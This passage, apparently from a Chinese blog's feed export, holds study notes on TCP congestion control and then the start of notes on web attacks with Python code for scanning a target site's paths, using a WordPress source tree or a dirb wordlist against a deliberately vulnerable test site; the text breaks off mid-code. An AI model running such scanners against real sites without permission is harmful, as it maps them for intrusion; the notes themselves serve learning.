<p>拥塞，没有一个官方的定义：太多的数据需要网络传输，超过了网络的处理能力。</p>
<p>拥塞控制与流量控制不同，流量控制是端到端之间的，而拥塞控制是网络的。</p>
<p>拥塞的表现：</p>
<ul>
<li>分组丢失：路由器缓冲区溢出</li>
<li>分组经理比较长的延迟：在路由器中的队列排队</li>
</ul>
<p>拥塞控制是网络 Top10 问题。</p>
<h2 id="拥塞的原因代价">6.1. 拥塞的原因/代价</h2>
<p>为了更好的说明拥塞，引入以下几个场景</p>
<h3 id="场景1">6.1.1. 场景1</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604135804.png" /></p>
<p>如上图，2个发送端，2个接收端。一个路由器具备无限大的缓冲。发送端到路由器的输出链路带宽为R。并且没有重传（分组不会丢失，就没必要重传）</p>
<p>此时，数据往网络中传入分组的速度 <span
class="math inline">\(\lambda_{in}\)</span>
以及分组从网络中出来，到达接收到的速度 <span
class="math inline">\(\lambda_{out}\)</span> 的关系如下所示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604140043.png" /></p>
<p>当 <span class="math inline">\(\lambda_{in}\)</span> 没到达 R/2
时，某一时间段，向网络中传入多少分组，网络就会输出多少分组。但是，一旦
<span class="math inline">\(\lambda_{in}\)</span> 达到并且超过 R/2
时，无论像网络中传入多少分组，网络只能输出 R/2
的分组，因为这到达链路的上限了。</p>
<p>这种情况下，网络延迟和 <span
class="math inline">\(\lambda_{in}\)</span> 的关系如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604140312.png" /></p>
<h3 id="场景2">6.1.2. 场景2</h3>
<p>这种情况下，路由器缓冲队列有限，发送端知道路由器的缓冲区有没有空间</p>
<ul>
<li>只在缓冲区可用的时候发送</li>
<li>分组不会丢失：<span class="math inline">\(\lambda^{&#39;}_{in} =
\lambda_{in}\)</span></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604142205.png" /></p>
<p>这种情况下就很简单了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604142348.png" /></p>
<p>该场景下，网络延迟也不算高，取决于路由器的缓冲队列的长度。</p>
<h3 id="场景3">6.1.3. 场景3</h3>
<p>与场景2类似，不过这时候不知道路由器缓冲区信息，但是<strong>明确知道分组是否丢失</strong>（任何时刻只要分组丢失，发送端都能知道）</p>
<ul>
<li>分组丢失时，发送端重传</li>
<li>分组会丢失，所以 <span class="math inline">\(\lambda^{&#39;}_{in} =
\lambda_{in}\)</span></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604142828.png" /></p>
<p>这种情况下，<span class="math inline">\(\lambda^{&#39;}_{in}\)</span>
和 <span class="math inline">\(\lambda_{out}\)</span> 的关系如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604142916.png" /></p>
<p>这是因为，当分组传入网络的速度小时，路由器还能服务的过来，缓冲区不满，此时分组不会丢失，因此早期的时候还是接近于1比1的关系。</p>
<p>但是当分组传入的速度达到一定程度的时候，路由器服务不来了，缓冲区逐渐被填满，当再来分组时只能被丢弃，这时候可能传入100的分组，但是出来时只有80个，20个被丢弃了。</p>
<p>如果需要达到100的吞吐量，那么发送方就需要往网络传入140甚至更多的分组，40都是重传的。</p>
<p>现实情况与这非常的像，不过有一点不一样，那就是现实中并不知道分组是否丢失（可能是个倒霉蛋，每次都在路由器队列的最后一个），超时定时器一到，就会重传。此时，网络中就有可能存在一个或多个同样的分组。但是
<span class="math inline">\(\lambda^{&#39;}_{in}\)</span> 和 <span
class="math inline">\(\lambda_{out}\)</span> 关系图还是一样的。</p>
<h3 id="场景4">6.1.4. 场景4</h3>
<p>这是网络中最坏的一种情况</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604143647.png" /></p>
<p>解释一下：</p>
<ul>
<li>A发送给D的分组经过2，3路由器</li>
<li>B发送给C的分组经过1，2路由器</li>
<li>C发送给B的分组经过3，4路由器</li>
<li>D发送给A的分组经过4，1路由器</li>
</ul>
<p>当 <span class="math inline">\(\lambda^{&#39;}_{in}\)</span> 和 <span
class="math inline">\(\lambda_{in}\)</span> 增加时，会发生什么情况？</p>
<p>刚开始随着<span class="math inline">\(\lambda^{&#39;}_{in}\)</span>
和 <span class="math inline">\(\lambda_{in}\)</span>
增加，吞吐量也会增加。</p>
<p>红色的分组和蓝色的分组都需要经过2号路由器，但是红色的可以直达，而蓝色的需要经过1号路由器。<strong>当
<span class="math inline">\(\lambda^{&#39;}_{in}\)</span> 和 <span
class="math inline">\(\lambda_{in}\)</span>
增加，使网络会非常拥塞时，每个路由器的缓冲区一般都处于满的状态，有时候会空出一个位置，又立马被其他分组给填入</strong>。</p>
<p>这种情况下，2号路由器空出的位置会被哪个颜色的分组给占有呢？答案是红色，因为红色从主机出来直接就到了2号速度较快，而蓝色需要经过1号再到达2号，速度较慢。因此蓝色分组会在红色分组到达2号路由器之后到达，此时路由器缓冲区已满，蓝色分组被丢弃。</p>
<p>其他路由器也是一样的。3号路由器是红色和绿色共用，但是红色到达3号时会被丢弃。4号路由器又绿色和粉色公用，绿色到达4号时会被丢弃。1号路由器由粉色和蓝色公用，粉色到达1号时会被丢弃。</p>
<p>这种情况下，所有路由器死锁。即使4个发送方疯狂的往网络里传入数据，也没有一个数据可以从网络中出来。吞吐量为0，此时<span
class="math inline">\(\lambda^{&#39;}_{in}\)</span> 和 <span
class="math inline">\(\lambda_{out}\)</span> 的关系如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604144605.png" /></p>
<p>因此，从上述4个场景总结出拥塞的代价有：</p>
<ul>
<li>为了达到一个有效输出，网络需要做更多工作（重传）</li>
<li>没有必要的重传，使得链路中存在多个同一分组的copy，降低了有效输出率</li>
<li>当分组丢失时，任何“关于这个分组的上游传输能力”都被浪费</li>
</ul>
<blockquote>
<p>上游传输能力：以场景4中红色分组为例，红色分组在3号路由器被丢弃，但是此时它已经经过了2号路由器，此时被丢弃，那么在2号路由器中排队的时间都被浪费，这就是上有传输能力被浪费的意思。这在网络拥塞的时候是很可惜的。</p>
</blockquote>
<h2 id="拥塞控制的方法">6.2. 拥塞控制的方法</h2>
<p>有两种拥塞控制的方法</p>
<ol type="1">
<li><strong>端到端的拥塞控制</strong>
<ul>
<li>没有来自网络的显式反馈</li>
<li>端系统根据延迟和丢失时间推断是否拥塞</li>
<li>TCP采用该方法（TCP根据超时重传、收到3个冗余的Ack来判断网络拥塞以降低发送速率）</li>
</ul></li>
<li><strong>网络辅助的拥塞控制</strong>
<ul>
<li>路由器提供给端系统反馈信息
<ul>
<li>设置bit位，显示是否有拥塞</li>
<li>显示提供发送端可以采用的速率</li>
</ul></li>
</ul></li>
</ol>
<p>TCP采用的比较好理解，如果发送端超时重传，或者收到3个冗余的Ack，说明之前发送的分组对方没有收到，有理由的怀疑网络可能出现了拥塞。</p>
<p>举一个ATM ABR的拥塞控制了解第二种办法</p>
<p><strong>Asynchronous Transfer Mode(ATM)中</strong>：</p>
<ul>
<li>发送的是信元，固定为53字节，5字节的头部和48字节的数据
<ul>
<li>资源管理信息RM cell</li>
<li>数据心愿 data cell</li>
</ul></li>
<li>发送端发送data cell的时候，会将RM cell有间隔的插入data cell中</li>
<li>RM
cell中有三个bit信息，可以被交换机、路由器设置（<strong>网络辅助</strong>）
<ul>
<li>NI bit: no increase in rate（轻微拥塞）速率不要增加了</li>
<li>CI bit: congestion indication 拥塞指示</li>
<li>ER: explicit rate 当前经过的链路的最小带宽（两个bit）</li>
</ul></li>
<li>接收到接收到RM cell不做任何修改，直接返回给发送端</li>
</ul>
<p><strong>Available Bit Rate(ABR)</strong>：</p>
<ul>
<li>如果发送端的路径轻载，发送方可以使用整个带宽，或者有时候超过一点也没问题的速率发送</li>
<li>如果发送端路径拥塞，发送方限制其发送的速度到一个最小保障的速率上</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604150112.png" /></p>
<p>RM cell每经过一个路由器，该路由器就会设置NI, CI,
ER，如果网络有一点拥塞，将NI置1；如果网络已经很拥塞了，将CI置1；</p>
<p>路由器还会修改ER，如果它的发送带宽是100，但是ER的值被其他路由器修改了，比如说当前是150，那么该路由器会将ER的值改为100；如果ER的值当前是70，那么该路由器就不会修改ER的值。因此，当RM
cell从发送端出发，到达接收端再返回到发送端，发送端就能够知道网络是否拥塞（NI,
CI），并且能够知道上一次网络路径中的最小链路的带宽。</p>
<h1 id="tcp拥塞控制">7. TCP拥塞控制</h1>
<p>虽然拥塞控制的方法2的效果会比较好，但是网络核心的路由器的负担会加重，不符合网络核心简单的TCP/IP架构原则。所以<strong>TCP采用端到端的拥塞控制机制</strong>。</p>
<blockquote>
<p>TCP/IP架构原则：网络核心简单；复杂的功能放在网络边缘（传输层及以上）实现</p>
</blockquote>
<p>接下来需要解决拥塞控制的两个比较大的问题：</p>
<ol type="1">
<li>发送方如何检测拥塞</li>
<li>控制策略：检测到拥塞之后该怎么办</li>
</ol>
<h2 id="拥塞感知">7.1. 拥塞感知</h2>
<p>主要将网络拥塞分为两类：</p>
<ol type="1">
<li>网络拥塞</li>
<li>轻微拥塞</li>
</ol>
<p>之前也提到过，可以通过<strong>分组丢失</strong>或者<strong>3个冗余的Ack</strong>来判断网络是否拥塞。</p>
<p><strong>一旦分组丢失，发送方就会认为网络拥塞</strong>，分组丢失也有两个原因：</p>
<ol type="1">
<li>原因1：网络拥塞（某个路由器的缓冲区满，分组被丢弃），<strong>概率大</strong></li>
<li>原因2：出错被丢弃（各种出错，比如比特错误），<strong>概率小</strong>。如果是物理连接，不是Wi-Fi，则概率更小了</li>
</ol>
<p>不论什么原因，这都会导致超时时间到达，但是ack没有到达。<strong>一旦超时，发送方就会认为网络拥塞了</strong>。虽然有一定的误判，比如说原因2并不是网络拥塞，此时网络可能不拥塞，但也是会被发送方认为拥塞。但是总体的控制方向是对的，小概率的误判不会影响整体的性能。</p>
<p><strong>3个冗余的Ack则发送方认为网络轻微拥塞</strong>。解释可以看下图，比较好理解。ack都能到来这么多次，说明拥塞不严重嘛。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604182606.png" /></p>
<h2 id="控制策略">7.2. 控制策略</h2>
<blockquote>
<p>下面提到的CongWin/2指的是上次CongWin/2的值作为这次CongWin的阈值(ssthresh)</p>
</blockquote>
<p>如果检测到拥塞或者轻微拥塞，发送方需要控制发送的速率：</p>
<ul>
<li><p>维持一个拥塞窗口的值：CongWin</p></li>
<li><p>发送端限制<strong>已发送但是未确认</strong>的数据量的上限，即发送窗口要小于CongWin：</p>
<p><span class="math inline">\(LastByteSent-LastByteAcked \leq
CongWin\)</span></p></li>
</ul>
<p>根据上面两点，粗略的控制发送方往网络中注入的速率。</p>
<p><span class="math display">\[
rate \approx \frac {CongWin}{RTT} B/s
\]</span></p>
<p>那么具体是如何操作的呢？首先，CongWin是动态的，是感知到网络拥塞程度的函数。</p>
<ul>
<li>超时或者3个冗余的Ack，此时 CongWin 应该 ⬇&gt;，但是处理还是不同的：
<ul>
<li><strong>超时</strong>：CongWin降为1MSS，进入SS(slow-start)阶段，然后再倍增到
CongWin/2（每个RTT，CongWin翻倍，但不能超过CongWin/2），从而进入CA(Congestion
Avoidance)阶段</li>
<li><strong>3个冗余的Ack</strong>：CongWin 降为
CongWin/2，直接进入CA阶段</li>
</ul></li>
<li>既没有超时，也没有3个冗余的Ack，CongWin 应该 ⬆，分为两个阶段：
<ul>
<li><strong>SS阶段</strong>：指数增加（每个RTT）</li>
<li><strong>CA阶段</strong>：加性增加（每个RTT）</li>
</ul></li>
</ul>
<p>这是对CongWin的控制，同时还需要控制发送窗口不能太大，否则即使速率慢下来了，还是会往网络中注入很多的数据。对发送窗口的控制采取联合控制的方法：</p>
<ul>
<li>发送端控制<strong>发送但是未确认的</strong>数据量同时也不能够超过接收窗口，满足流量控制要求</li>
<li><span class="math inline">\(sendWin = min(CongWin,
RecvWin)\)</span></li>
<li>这样的控制方法同时满足<strong>流量控制</strong>和<strong>拥塞控制</strong></li>
</ul>
<p>总结一下拥塞控制策略：</p>
<ol type="1">
<li>慢启动(slow start, SS)</li>
<li>拥塞避免(congestion avoidance, CA)：AIMD(Additive-Increase,
Multiplicative-Decrease)：加性增、乘性减少</li>
<li>超时后的保守策略（CongWin降为1MSS）</li>
</ol>
<h3 id="慢启动阶段">7.2.1. 慢启动阶段</h3>
<p><strong>重要判断依据：CongWin &lt; ssthresh</strong></p>
<p>连接刚建立的时候，CongWin =
1MSS。接着进行指数性增加，知道检测到拥塞</p>
<ul>
<li>启动初值很低</li>
<li>但是速度很快</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604184512.png" /></p>
<p>如上图：</p>
<ul>
<li>刚开始的时候，CongWin为1，发送一个segment，RTT之后收到一个ack，此时CongWin翻倍，变为2</li>
<li>发送2个segment，一个RTT之后，收到1个Ack（这个Ack是对两个segment的确认，或者说收到2个Ack），此时CongWin再次翻倍，变为4</li>
<li>发送4个segment，一个RTT之后，收到1个Ack（对4个segment的确认），CongWin变为8</li>
<li>....</li>
</ul>
<p>所以慢启动的特点有：</p>
<ol type="1">
<li>每一个RTT，CongWin翻倍</li>
<li>每收到一个报文的Ack，CongWin加1（与第一个特点等价，CongWin为多少，一个RTT内就会收到多少个segment的Ack）</li>
<li>只要不超时或者收到3个冗余的Ack，CongWin每个RTT都会翻倍</li>
</ol>
<p>总结：慢启动初始速率很慢（1MSS），但是加速度很快，是指数性的。极短时间内就能增加到
CongWin/2 的值，因此后面的计算会将SS忽略不计。</p>
<p>不论是慢启动阶段还是拥塞避免阶段，只要发生了<strong>分组丢失</strong>，就会执行两件事：</p>
<ol type="1">
<li>ssthresh = CongWin/2</li>
<li>CongWin = 1 MSS</li>
</ol>
<p>然后进入慢启动阶段。</p>
<h3 id="拥塞避免阶段">7.2.2. 拥塞避免阶段</h3>
<p><strong>重要判断依据：CongWin &gt;= ssthresh</strong></p>
<p>当慢启动达到阈值时，也就是 CongWin = ssthresh
时，进入拥塞避免阶段。该阶段有3个特点：</p>
<ul>
<li><strong>加性增</strong>：当 CongWin = ssthresh
后，一个RTT内没有发生<strong>分组丢失</strong>或者收到<strong>3个冗余的Ack</strong>，将CongWin加上1个MSS；</li>
<li><strong>乘性减</strong>：当 CongWin = ssthresh
后，一个RTT内发生了<strong>3个冗余的Ack</strong>，ssthresh=CongWin/2,
CongWin=sshtresh+3</li>
</ul>
<p>长期来看就是长这样：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604190419.png" /></p>
<p>（忽略掉了慢启动过程）</p>
<h3 id="两个阶段具体实现">7.2.3. 两个阶段具体实现</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604190756.png" /></p>
<p>解释（蓝色）：在这之前，CongWin=16MSS的时候，发生了超时，因此，ssthresh=16/2=8，CongWin
= 1。将其分为4个阶段</p>
<ol type="1">
<li>SS阶段，每个RTT内没有感知到拥塞，因此翻倍增加，直到
CongWin=ssthresh。之后进入CA</li>
<li>CA阶段，每个RTT内没有感知到拥塞，因此每次加1，直到发生了超时，ssthresh
= CongWin/2=6, CongWin=1。再次进入到SS阶段</li>
<li>还是SS阶段，需要注意的是4之后变成6，这里不再翻倍是因为ssthresh为6，SS阶段的CongWin只能
<span class="math inline">\(\leq\)</span> ssthresh</li>
<li>再次进入到CA阶段</li>
</ol>
<p>这里其实少了一种情况，假设第4阶段到达
CongWin=10时发生了3个冗余的Ack，那么ssthresh=CongWin/2=5，CongWin=ssthresh+3=8，直接进入CA阶段</p>
<h3 id="总结-1">7.2.4. 总结</h3>
<ol type="1">
<li>当 CongWin &lt; ssthresh 时，发送端处于SS阶段，窗口指数性增长</li>
<li>当 CongWin &gt;= ssthresh 时，发生端处于CA阶段，窗口加性增长</li>
<li>当收到3个冗余的Ack时，ssthresh=CongWin/2, CongWin=ssthresh+3</li>
<li>当超时事件发生时，ssthresh=CongWin/2, CongWin=1，进入SS阶段</li>
</ol>
<h2 id="tcp吞吐量">7.3. TCP吞吐量</h2>
<p>忽略慢启动阶段，假设发送端总有数据传输。W为发生丢失事件时的窗口尺寸</p>
<p><span class="math display">\[平均窗口尺寸 = (\frac w2 + w)/2 = \frac
34w\]</span></p>
<p><span class="math display">\[平均吞吐量 = \frac
{3w}{4RTT}\]</span></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604193208.png" /></p>
<h2 id="tcp公平性">7.4. TCP公平性</h2>
<p><strong>目标：如果K个TCP连接分享一个带宽为R的链路，每一个会话的有效带宽为
R/K</strong></p>
<p>简化以下，假设k为2，R为10</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604193323.png" /></p>
<p>上图的模型，可以画出下图的坐标示意图，其中，x轴为TCP连接1的注入网络的速率（数据包的量），y轴为TCP连接2的注入网络的速率（数据包的量）。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604194723.png" /></p>
<p>解释一下：</p>
<ul>
<li>假设最开始的时候很不公平，从E点开始，此时TCP1占用5，TCP2占用1，然后线性增加到达F，TCP1占用6，TCP2占用2，依此类推，到达H点，TCP1占用8，TCP2占用4，此时已经两者之后超过了10，但这是可以做得到的，因为网络会有时延的，G点虽然占用了正好的10，但这个时候可能还没收到拥塞感知的消息，因此继续加到H，收到了拥塞感知，那么需要减半，到达I点</li>
<li>同样的过程I一直增加到M点，然后继续减半到N</li>
<li>N也是一样到P点，然后减半到Q</li>
<li>Q也是继续增加，这里没画完</li>
</ul>
<p>可以看到，整个过程两个TCP连接的注入网络的速率越来越逼近 y=x
那条线，也就是两个连接发送数据的量越来越趋近于相等。也就是两个TCP连接占用链路的带宽也趋近于相等。因此，会越来越公平。</p>
<p><strong>结论：长期来看，TCP是具有公平性的</strong></p>
<p>作为对比，UDP就不具有公平性。UDP不管拥塞，也不管发的太快对方能否接收，只要有数据就一直发。假设数据一直有，那么先进行UDP数据发送的占用链路的大部分资源，后进行的占用少部分资源。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算网络教程 自顶向下方法</tag>
        <tag>B站中科大计网</tag>
      </tags>
  </entry>
  <entry>
    <title>第 4 章 Web 攻击</title>
    <url>/2022/06/23/%E7%AC%AC%204%20%E7%AB%A0%20Web%20%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="开源-web-应用路径扫描">1. 开源 Web 应用路径扫描</h1>
<p>我们平常用的路径扫描工具都是利用一个比较大的字典，里面包括了可能存在的目录和文件名，利用该字典去扫描目标网站，根据返回的状态码判断目标网站是否存在对应的路径。</p>
<p>本小节我们将会实现类似的一个功能，不过不同的是我们针对的是某一个开源的
CMS (Content Management System)。以 wordpress
为例，我们首先去官网下载一套源码：<a href="https://wordpress.org/">Blog
Tool, Publishing Platform, and CMS | WordPress.org</a>
，然后编写如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> contextlib, os, queue, requests, sys, threading, time</span><br><span class="line">FILETERED = [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;css&#x27;</span>]</span><br><span class="line">TARGET = <span class="string">&#x27;http://target&#x27;</span>  <span class="comment"># 目标网站</span></span><br><span class="line">THREADS = <span class="number">10</span></span><br><span class="line">answers = queue.Queue()</span><br><span class="line">web_paths = queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gather_paths</span>():</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> fname <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> os.path.splitext(fname)[<span class="number">1</span>] <span class="keyword">in</span> FILETERED:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            path = os.path.join(root, fname)</span><br><span class="line">            <span class="keyword">if</span> path.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                path = path[<span class="number">1</span>:]</span><br><span class="line">            <span class="built_in">print</span>(path)</span><br><span class="line">            web_paths.put(path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextlib.contextmanager </span><span class="comment"># 上下文管理器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chdir</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    On enter, change directory to specified path.</span></span><br><span class="line"><span class="string">    On exit, change directory back to original.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    this_dir = os.getcwd()</span><br><span class="line">    os.chdir(path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span> <span class="comment"># ？？？</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        os.chdir(this_dir)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> chdir(<span class="string">&#x27;/home/m1ku/Downloads/wordpress/&#x27;</span>):</span><br><span class="line">        gather_paths()</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&#x27;Press return to continue&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上述代码的主要作用就是<strong>从下载的 CMS
的整个目录中找到我们感兴趣的后缀的文件，然后将这些文件名用一个队列保存
<code>web_paths</code></strong>，这个作用主要是通过
<code>gather_paths()</code> 函数实现。而 <code>chdir()</code>
函数的作用是 <strong>改变脚本运行的目录</strong>。</p>
<p>CMS 和当前脚本并不在一个目录，而 <code>gather_paths()</code>
函数没有改变目录的代码，<code>for root, dirs, files in os.walk('.')</code>
这里面的 <code>.</code>
表示的是当前目录，如果没有改变工作目录的话，那么这句代码就会遍历脚本所在目录，而不是
CMS 目录。所以，改变工作目录的的活由 <code>chdir()</code> 完成。</p>
<p><code>@contextlib.contextmanager</code> 表示 <code>chdir()</code>
函数可以使用 <code>with</code>
具备上下文管理器，以一句常见的代码为例作解释，如果我们要读取一个文件的内容，需要三步：</p>
<ol type="1">
<li>打开文件</li>
<li>读取内容</li>
<li>关闭文件</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;myanswers.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)  </span><br><span class="line">content = f.read()  </span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure>
<p>而我们一般都不会这样子写，更常见的写法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;myanswers.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    content = f.read()  </span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
<p>这个 <code>with</code>
语句其实就是一个上下文管理器，我们只需要使用该语句打开文件然后进行操作，关闭的操作不需要我们手动完成，由上下文管理器来完成，当我们退出这个
<code>with</code> 语句的有效范围的时候，自动关闭文件。</p>
<blockquote>
<p>finally: 不论 try
成功或者失败，都会执行。保证了函数退出时能够把工作路径切换回来。</p>
</blockquote>
<p>上述代码中设置了 4
个后缀，如果文件包含其中某个后缀，说明这些文件是我们所不关心的，当然，这里可以自定义，如果只关心后缀为
<code>php</code> 的，也可以自己设置。至此，我们获得了开源 CMS
的我们关心的文件名，这可以说是针对这一个 CMS 的字典。</p>
<p>接下来，我们需要使用这个字典去扫描目标网站，下面两个函数就是实现这个功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_remote</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> web_paths.empty():</span><br><span class="line">        path = web_paths.get()</span><br><span class="line">        url = <span class="string">f&#x27;<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;path&#125;</span>&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            answers.put(url)</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    mythreads = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Spawning thread <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        t = threading.Thread(target=test_remote)</span><br><span class="line">        mythreads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> mythreads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure>
<p>这里使用多线程操作，能够使扫描速度加快。其次，如果速度太快，可能会IP会被目标网站封锁，因此这里
<code>time.sleep(2)</code>
就是降低速度，保证不被封锁。如果最后返回的状态码是
200，说明目标网站存在对应的文件，将这些文件写入到 <code>answers</code>
队列中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> chdir(<span class="string">&#x27;/home/m1ku/Downloads/wordpress/&#x27;</span>):</span><br><span class="line">        gather_paths()</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&#x27;Press return to continue&#x27;</span>)</span><br><span class="line">    run()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;myanswers.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> answers.empty():</span><br><span class="line">            f.write(<span class="string">f&#x27;<span class="subst">&#123;answers.get()&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最后，将 <code>answers</code> 队列中的内容保存到
<code>myanswers.txt</code> 中。至此，针对开源 CMS
的路径扫描就完成了我们查看一下结果（保护隐私会打上马赛克），有的文件是需要用户名和密码登录的，因此运行过程中会出现异常，这后期可以优化，这里就不管了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623201946.png" /></p>
<p>而 myanswers.txt 中也得到了对应的结果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623202107.png" /></p>
<h1 id="暴力路径扫描">2. 暴力路径扫描</h1>
<p>上一节是针对某个开源 CMS
的路径扫描，我们可以通过下载源码得到目标网站中大概率存在的文件。但日常情况下，更有可能是面对的是一个没有使用开源
CMS
的网站，这种情况下只能使用字典进行暴力扫描。接下来，我们就会尝试编写这样一个工具。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AGENT = <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 FIrefox/19.0&#x27;</span></span><br><span class="line">EXTENSIONS = [<span class="string">&#x27;.php&#x27;</span>, <span class="string">&#x27;.bak&#x27;</span>, <span class="string">&#x27;.orig&#x27;</span>, <span class="string">&#x27;.inc&#x27;</span>] <span class="comment"># 感兴趣的后缀</span></span><br><span class="line">TARGET = <span class="string">&#x27;http://testphp.vulnweb.com/&#x27;</span> <span class="comment"># 目标网站</span></span><br><span class="line">THREADS = <span class="number">50</span></span><br><span class="line">WORDLIST = <span class="string">&#x27;/usr/share/dirb/wordlists/small.txt&#x27;</span> <span class="comment"># 使用一个小点的字典</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_words</span>(<span class="params">resume=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extend_words</span>(<span class="params">word</span>):</span> <span class="comment"># 嵌套函数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">            words.put(<span class="string">f&#x27;/<span class="subst">&#123;word&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            words.put(<span class="string">f&#x27;/<span class="subst">&#123;word&#125;</span>/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> extension <span class="keyword">in</span> EXTENSIONS:</span><br><span class="line">            words.put(<span class="string">f&#x27;/<span class="subst">&#123;word&#125;</span><span class="subst">&#123;extension&#125;</span>&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">with</span> <span 